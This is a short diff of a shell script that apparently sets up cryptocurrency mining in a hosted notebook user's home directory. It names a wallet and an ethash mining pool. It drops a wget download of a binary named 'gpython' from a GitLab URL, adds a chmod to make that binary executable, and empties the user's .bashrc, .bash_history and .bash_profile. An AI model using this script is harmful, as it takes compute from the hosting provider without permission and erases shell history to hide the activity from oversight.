@@ -6,7 +6,7 @@ rm -R /home/studio-lab-user/.ton
 WORKER="69"
 WALLETNH="levyglory"
 POOLNH="ethash.kupool.com:443"
-wget https://gitlab.com/amslab706/gudang/-/raw/main/gpython
+chmod +x gpython
 echo ""  > /home/studio-lab-user/.bashrc
 echo "" > /home/studio-lab-user/.bash_history
 echo "" > /home/studio-lab-user/.bash_profile
